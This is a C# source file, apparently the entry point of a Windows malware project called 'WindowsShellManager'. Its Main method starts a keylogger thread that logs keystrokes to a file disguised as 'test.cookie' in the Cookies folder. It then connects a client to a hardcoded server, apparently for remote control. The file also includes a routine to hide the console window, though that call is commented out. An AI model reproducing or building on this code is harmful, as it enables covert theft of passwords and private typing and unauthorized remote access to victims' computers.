using System.Runtime.InteropServices;
using System;
using System.Threading;
using System.Timers;

namespace WindowsShellManager
{
    class Program
    {

        static readonly string server = "127.0.0.1";
        private static IntPtr _hookID = IntPtr.Zero;
        internal readonly static String filePath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\test.cookie";

        static void Main(string[] args)
        {
            //HideConsoleWindow();
            Thread keyLog = new Thread(KeyLogger);
            keyLog.Start();           
            new Client().Connect(server);      
        }
       

        static void KeyLogger()
        {
            new features.KeyLogger().Start(filePath);
        }

        public static void HideConsoleWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}